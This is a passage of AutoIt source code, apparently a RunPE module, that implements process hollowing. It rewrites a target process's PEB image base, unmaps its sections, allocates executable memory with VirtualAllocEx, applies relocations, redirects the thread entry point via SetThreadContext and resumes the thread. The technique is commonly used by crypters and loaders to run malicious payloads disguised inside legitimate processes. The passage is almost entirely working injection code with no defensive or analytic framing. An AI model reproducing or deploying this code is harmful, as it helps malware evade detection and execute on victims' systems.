"DWORD ENVIRONMENTUPDATECOUNT;" & _
"PTR KERNELCALLBACKTABLE;" & _
"PTR EVENTLOGSECTION;" & _
"PTR EVENTLOG;" & _
"PTR FREELIST;" & _
"DWORD TLSEXPANSIONCOUNTER;" & _
"PTR TLSBITMAP;" & _
"DWORD TLSBITMAPBITS[2];" & _
"PTR READONLYSHAREDMEMORYBASE;" & _
"PTR READONLYSHAREDMEMORYHEAP;" & _
"PTR READONLYSTATICSERVERDATA;" & _
"PTR ANSICODEPAGEDATA;" & _
"PTR OEMCODEPAGEDATA;" & _
"PTR UNICODECASETABLEDATA;" & _
"DWORD NUMBEROFPROCESSORS;" & _
"DWORD NTGLOBALFLAG;" & _
"BYTE SPARE2[4];" & _
"INT64 CRITICALSECTIONTIMEOUT;" & _
"DWORD HEAPSEGMENTRESERVE;" & _
"DWORD HEAPSEGMENTCOMMIT;" & _
"DWORD HEAPDECOMMITTOTALFREETHRESHOLD;" & _
"DWORD HEAPDECOMMITFREEBLOCKTHRESHOLD;" & _
"DWORD NUMBEROFHEAPS;" & _
"DWORD MAXIMUMNUMBEROFHEAPS;" & _
"PTR PROCESSHEAPS;" & _
"PTR GDISHAREDHANDLETABLE;" & _
"PTR PROCESSSTARTERHELPER;" & _
"PTR GDIDCATTRIBUTELIST;" & _
"PTR LOADERLOCK;" & _
"DWORD OSMAJORVERSION;" & _
"DWORD OSMINORVERSION;" & _
"DWORD OSBUILDNUMBER;" & _
"DWORD OSPLATFORMID;" & _
"DWORD IMAGESUBSYSTEM;" & _
"DWORD IMAGESUBSYSTEMMAJORVERSION;" & _
"DWORD IMAGESUBSYSTEMMINORVERSION;" & _
"DWORD GDIHANDLEBUFFER[34];" & _
"DWORD POSTPROCESSINITROUTINE;" & _
"DWORD TLSEXPANSIONBITMAP;" & _
"BYTE TLSEXPANSIONBITMAPBITS[128];" & _
"DWORD SESSIONID")
; FILL THE STRUCTURE
$ACALL = DLLCALL("KERNEL32.DLL", "BOOL", "ReadProcessMemory", _
"PTR", $HPROCESS, _
"PTR", $PPEB, _ ; POINTER TO PEB STRUCTURE
"PTR", DLLSTRUCTGETPTR($TPEB), _
"DWORD_PTR", DLLSTRUCTGETSIZE($TPEB), _
"DWORD_PTR*", 0)
; CHECK FOR ERRORS OR FAILURE
IF  @ERROR OR NOT $ACALL[0] THEN
    DLLCALL("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $HPROCESS, "DWORD", 0)
RETURN SETERROR(8, 0, 0) ; READPROCESSMEMORY FUNCTION OR CALL TO IT FAILED WHILE FILLING PEB STRUCTURE
ENDIF
; CHANGE BASE ADDRESS WITHIN PEB
DLLSTRUCTSETDATA($TPEB, "IMAGEBASEADDRESS", $PZEROPOINT)
; WRITE THE CHANGES
$ACALL = DLLCALL("KERNEL32.DLL", "BOOL", "WriteProcessMemory", _
"HANDLE", $HPROCESS, _
"PTR", $PPEB, _
"PTR", DLLSTRUCTGETPTR($TPEB), _
"DWORD_PTR", DLLSTRUCTGETSIZE($TPEB), _
"DWORD_PTR*", 0)
; CHECK FOR ERRORS OR FAILURE
IF  @ERROR OR NOT $ACALL[0] THEN
DLLCALL("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $HPROCESS, "DWORD", 0)
RETURN SETERROR(9, 0, 0) ; WRITEPROCESSMEMORY FUNCTION OR CALL TO IT FAILED WHILE CHANGING BASE ADDRESS
ENDIF
#REGION 9. NEW ENTRY POINT
; ENTRY POINT MANIPULATION
SWITCH $IRUNFLAG
CASE 1
  DLLSTRUCTSETDATA($TCONTEXT, "EAX", $PZEROPOINT + $IENTRYPOINTNEW)
CASE 2
  DLLSTRUCTSETDATA($TCONTEXT, "RCX", $PZEROPOINT + $IENTRYPOINTNEW)
CASE 3
  ; FIXME - ITANIUM ARCHITECTURE
ENDSWITCH
#REGION 10. SET NEW CONTEXT
; NEW CONTEXT:
$ACALL = DLLCALL("KERNEL32.DLL", "BOOL", "SetThreadContext", _
"HANDLE", $HTHREAD, _
"PTR", DLLSTRUCTGETPTR($TCONTEXT))
IF  @ERROR OR NOT $ACALL[0] THEN
DLLCALL("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $HPROCESS, "DWORD", 0)
RETURN SETERROR(10, 0, 0) ; SETTHREADCONTEXT FUNCTION OR CALL TO IT FAILED
ENDIF
#REGION 11. RESUME THREAD
; AND THAT'S IT!. CONTINUE EXECUTION:
$ACALL = DLLCALL("KERNEL32.DLL", "DWORD", "ResumeThread", "HANDLE", $HTHREAD)
; CHECK FOR ERRORS OR FAILURE
IF  @ERROR OR $ACALL[0] = -1 THEN
DLLCALL("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $HPROCESS, "DWORD", 0)
RETURN SETERROR(11, 0, 0) ; RESUMETHREAD FUNCTION OR CALL TO IT FAILED
ENDIF
#REGION 12. CLOSE OPEN HANDLES AND RETURN PID
DLLCALL("KERNEL32.DLL", "BOOL", "CloseHandle", "HANDLE", $HPROCESS)
DLLCALL("KERNEL32.DLL", "BOOL", "CloseHandle", "HANDLE", $HTHREAD)
; ALL WENT WELL. RETURN NEW PID:
RETURN DLLSTRUCTGETDATA($TPROCESS_INFORMATION, "PROCESSID")
ENDFUNC   ;==>_RUNPE

FUNC __RUNPE_FIXRELOC ($PMODULE, $TDATA, $PADDRESSNEW, $PADDRESSOLD, $FIMAGEX64)

LOCAL $IDELTA = $PADDRESSNEW - $PADDRESSOLD ; DISLOCATION VALUE
LOCAL $ISIZE = DLLSTRUCTGETSIZE($TDATA) ; SIZE OF DATA
LOCAL $PDATA = DLLSTRUCTGETPTR($TDATA) ; ADDRES OF THE DATA STRUCTURE
LOCAL $TIMAGE_BASE_RELOCATION, $IRELATIVEMOVE
LOCAL $IVIRTUALADDRESS, $ISIZEOFBLOCK, $INUMBEROFENTRIES
LOCAL $TENRIES, $IDATA, $TADDRESS
LOCAL $IFLAG = 3 + 7 * $FIMAGEX64 ; IMAGE_REL_BASED_HIGHLOW = 3 OR IMAGE_REL_BASED_DIR64 = 10
WHILE $IRELATIVEMOVE < $ISIZE ; FOR ALL DATA AVAILABLE
$TIMAGE_BASE_RELOCATION = DLLSTRUCTCREATE("DWORD VIRTUALADDRESS; DWORD SIZEOFBLOCK", $PDATA + $IRELATIVEMOVE)
$IVIRTUALADDRESS = DLLSTRUCTGETDATA($TIMAGE_BASE_RELOCATION, "VIRTUALADDRESS")
$ISIZEOFBLOCK = DLLSTRUCTGETDATA($TIMAGE_BASE_RELOCATION, "SIZEOFBLOCK")
$INUMBEROFENTRIES = ($ISIZEOFBLOCK - 8) / 2
$TENRIES = DLLSTRUCTCREATE("WORD[" & $INUMBEROFENTRIES & "]", DLLSTRUCTGETPTR($TIMAGE_BASE_RELOCATION) + 8)
; GO THROUGH ALL ENTRIES
FOR $I = 1 TO $INUMBEROFENTRIES
  $IDATA = DLLSTRUCTGETDATA($TENRIES, 1, $I)
  IF  BITSHIFT($IDATA, 12) = $IFLAG THEN ; CHECK TYPE
   $TADDRESS = DLLSTRUCTCREATE("PTR", $PMODULE + $IVIRTUALADDRESS + BITAND($IDATA, 0XFFF)) ; THE REST OF $IDATA IS OFFSET
   DLLSTRUCTSETDATA($TADDRESS, 1, DLLSTRUCTGETDATA($TADDRESS, 1) + $IDELTA) ; THIS IS WHAT'S THIS ALL ABOUT
  ENDIF
NEXT
$IRELATIVEMOVE += $ISIZEOFBLOCK
WEND
RETURN 1 ; ALL OK!
ENDFUNC   ;==>__RUNPE_FIXRELOC

FUNC __RUNPE_ALLOCATEEXESPACEATADDRESS ($HPROCESS, $PADDRESS, $ISIZE)

; ALLOCATE
LOCAL $ACALL = DLLCALL("KERNEL32.DLL", "PTR", "VirtualAllocEx", _
"HANDLE", $HPROCESS, _
"PTR", $PADDRESS, _
"DWORD_PTR", $ISIZE, _
"DWORD", 0X1000, _ ; MEM_COMMIT
"DWORD", 64) ; PAGE_EXECUTE_READWRITE
; CHECK FOR ERRORS OR FAILURE
IF  @ERROR OR NOT $ACALL[0] THEN
; TRY DIFFERENTLY
$ACALL = DLLCALL("KERNEL32.DLL", "PTR", "VirtualAllocEx", _
"HANDLE", $HPROCESS, _
"PTR", $PADDRESS, _
"DWORD_PTR", $ISIZE, _
"DWORD", 0X3000, _ ; MEM_COMMIT|MEM_RESERVE
"DWORD", 64) ; PAGE_EXECUTE_READWRITE
; CHECK FOR ERRORS OR FAILURE
IF @ERROR OR NOT $ACALL[0] THEN RETURN SETERROR(1, 0, 0) ; UNABLE TO ALLOCATE
ENDIF
RETURN $ACALL[0]
ENDFUNC   ;==>__RUNPE_ALLOCATEEXESPACEATADDRESS

FUNC __RUNPE_ALLOCATEEXESPACE ($HPROCESS, $ISIZE)

; ALLOCATE SPACE
LOCAL $ACALL = DLLCALL("KERNEL32.DLL", "PTR", "VirtualAllocEx", _
"HANDLE", $HPROCESS, _
"PTR", 0, _
"DWORD_PTR", $ISIZE, _
"DWORD", 0X3000, _ ; MEM_COMMIT|MEM_RESERVE
"DWORD", 64) ; PAGE_EXECUTE_READWRITE
; CHECK FOR ERRORS OR FAILURE
IF  @ERROR OR NOT $ACALL[0] THEN RETURN SETERROR(1, 0, 0) ; UNABLE TO ALLOCATE
RETURN $ACALL[0]
ENDFUNC   ;==>__RUNPE_ALLOCATEEXESPACE

FUNC __RUNPE_UNMAPVIEWOFSECTION ($HPROCESS, $PADDRESS)

DLLCALL("NTDLL.DLL", "INT", "NtUnmapViewOfSection", _
"PTR", $HPROCESS, _
"PTR", $PADDRESS)
; CHECK FOR ERRORS ONLY
IF @ERROR THEN RETURN SETERROR(1, 0, 0) ; FAILURE
RETURN 1
ENDFUNC   ;==>__RUNPE_UNMAPVIEWOFSECTION

FUNC __RUNPE_ISWOW64PROCESS ($HPROCESS)

LOCAL $ACALL = DLLCALL("KERNEL32.DLL", "BOOL", "IsWow64Process", _
"HANDLE", $HPROCESS, _
"BOOL*", 0)
; CHECK FOR ERRORS OR FAILURE
IF  @ERROR OR NOT $ACALL[0] THEN RETURN SETERROR(1, 0, 0) ; FAILURE
RETURN $ACALL[2]
ENDFUNC   ;==>__RUNPE_ISWOW64PROCESS